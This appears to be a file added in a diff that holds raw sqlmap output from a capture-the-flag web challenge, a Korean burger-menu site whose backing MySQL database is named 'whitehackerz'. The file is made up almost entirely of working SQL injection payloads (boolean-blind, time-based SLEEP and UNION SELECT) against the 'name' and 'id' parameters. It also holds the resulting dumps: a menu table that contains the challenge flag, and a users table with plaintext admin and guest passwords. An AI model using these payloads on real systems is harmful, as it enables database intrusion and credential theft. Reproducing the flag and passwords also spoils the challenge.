@@ -1,0 +1,111 @@
+sqlmap identified the following injection point(s) with a total of 87 HTTP(s) requests:
+---
+Parameter: id (POST)
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: id=admin' AND (SELECT * FROM (SELECT(SLEEP(5)))YGYP) AND 'iTFo'='iTFo&pw=1234
+---
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL 5.0.12
+sqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests:
+---
+Parameter: name (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: name=Sn0wM4n_1cE_Cr3Am' AND 6232=6232 AND 'vYZY'='vYZY
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: name=Sn0wM4n_1cE_Cr3Am' AND (SELECT * FROM (SELECT(SLEEP(5)))ZhmZ) AND 'vNrF'='vNrF
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: name=-5414' UNION ALL SELECT NULL,NULL,CONCAT(0x7170717a71,0x6a54445a5358744c6451636e77544c716d536657764c736e73484e4e74506d55635671584f664451,0x717a627a71),NULL,NULL-- -
+---
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: name (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: name=Sn0wM4n_1cE_Cr3Am' AND 6232=6232 AND 'vYZY'='vYZY
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: name=Sn0wM4n_1cE_Cr3Am' AND (SELECT * FROM (SELECT(SLEEP(5)))ZhmZ) AND 'vNrF'='vNrF
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: name=-5414' UNION ALL SELECT NULL,NULL,CONCAT(0x7170717a71,0x6a54445a5358744c6451636e77544c716d536657764c736e73484e4e74506d55635671584f664451,0x717a627a71),NULL,NULL-- -
+---
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL >= 5.0.0
+current database:    'whitehackerz'
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: name (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: name=Sn0wM4n_1cE_Cr3Am' AND 6232=6232 AND 'vYZY'='vYZY
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: name=Sn0wM4n_1cE_Cr3Am' AND (SELECT * FROM (SELECT(SLEEP(5)))ZhmZ) AND 'vNrF'='vNrF
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: name=-5414' UNION ALL SELECT NULL,NULL,CONCAT(0x7170717a71,0x6a54445a5358744c6451636e77544c716d536657764c736e73484e4e74506d55635671584f664451,0x717a627a71),NULL,NULL-- -
+---
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL >= 5.0.0
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: name (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: name=Sn0wM4n_1cE_Cr3Am' AND 6232=6232 AND 'vYZY'='vYZY
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: name=Sn0wM4n_1cE_Cr3Am' AND (SELECT * FROM (SELECT(SLEEP(5)))ZhmZ) AND 'vNrF'='vNrF
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: name=-5414' UNION ALL SELECT NULL,NULL,CONCAT(0x7170717a71,0x6a54445a5358744c6451636e77544c716d536657764c736e73484e4e74506d55635671584f664451,0x717a627a71),NULL,NULL-- -
+---
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL >= 5.0.0
+Database: whitehackerz
+Table: menutable
+[10 entries]
++-------------------+-------+-------------------+-------------------+--------------------------------------------------------------------------------------------------------+
+| name              | price | dir_image         | burgername        | description                                                                                            |
++-------------------+-------+-------------------+-------------------+--------------------------------------------------------------------------------------------------------+
+| Ra1nB0w_bur93r    | 9000  | ./img/3.jpg       | 무지개 버거            | 고오급 고기로 만든 패티와 다양한 맛을 느낄 수 있는 무지개 버거!\n무지개 버거는 각각 핫스파이시맛, 오렌지맛, 카레맛, 미역맛, 소다맛, 룰루맛이 납니다.               |
+| G4rBag3_Bur93r    | 9000  | ./img/4.jpg       | 쓰레기 버거            | 쓰레기 버거는 흔한 음식물 쓰레기 냄새가 나면서 압정이 들어가 있으므로 먹을 때 주의가 필요합니다.\n주의! 다 먹고 배가 아프거나 건강에 문제가 생겨도 집게리아는 책임지지 않습니다. |
+| JuMb0_burger      | 9000  | ./img/5.jpg       | 점보 버거             | 설명이 필요 없을 정도로 무지 무지 무지 큽니다.                                                                            |
+| Sp0N9e_fr1eD      | 9000  | ./img/6.jpg       | 스펀지 튀김            | 집게리아의 직원 스펀지밥의 몸에서 뜯어낸 스펀지와 나무로 된 바를 합쳐 신선한 기름에 튀긴 스펀지 튀김은 바삭한 식감을 자랑하고 있습니다.                          |
+| Sn0wM4n_1cE_Cr3Am | 9000  | ./img/7.jpg       | 눈사람 아이스크림         | 눈사람 아이스크림은 눈사람을 얼려 바나나와 사탕, 체리, 초코시럽 등으로 데코한 겨울 한정 제품입니다.                                              |
+| Cr4B_cH3eSebur93r | 9000  | ./img/a.jpg       | 게살 버거             | 집게리아만의 특별레시피로 만든 집게리아의 시그니처 메뉴 게살 버거입니다.\n현재 게살버거 레시피 공개 이벤트를 진행중이니 참여하시면 레시피를 열람하실 수 있습니다.            |
+| Ey3bAlL_Bur93r    | 9000  | ./img/b.jpg       | 눈알 버거             | 평범한 햄버거 같지만 할로윈을 연상케 하는 새빨간 케첩과 눈알이 올라가 있는 눈알 버거입니다. 세트 메뉴를 시키시면 눈알의 주인공이 프린팅 된 음료 컵을 드립니다!            |
+| B0mb_p13          | 9000  | ./img/8.jpg       | 폭탄 파이             | 밀가루 반죽에 폭탄을 넣어 만든 파이입니다.\n특별한 날, 싫어하는 사람들에게 선물하세요!                                                     |
+| CAnN3d_p1e        | 9000  | ./img/9.jpg       | 통조림 파이            | 밀가루 반죽에 통조림 그 자체를 넣어서 구운 통조림 파이는 달걀의 고소한 맛과 캔의 비릿함이 섞인 독특한 맛을 자랑합니다.                                   |
+| mY_L0vE_f0r_P3@rL | 9000  | ./hidden/flag.png | mY_L0vE_f0r_P3@rL | ARGOS{M0n3Y_1S_7hE_B3st}                                                                               |
++-------------------+-------+-------------------+-------------------+--------------------------------------------------------------------------------------------------------+
+
+Database: whitehackerz
+Table: users
+[2 entries]
++-------+---------------+------+
+| id    | pw            | no   |
++-------+---------------+------+
+| guest | FsataDIwGVU   | 1    |
+| admin | hJUCUbFmQPLP4 | 2    |
++-------+---------------+------+
+
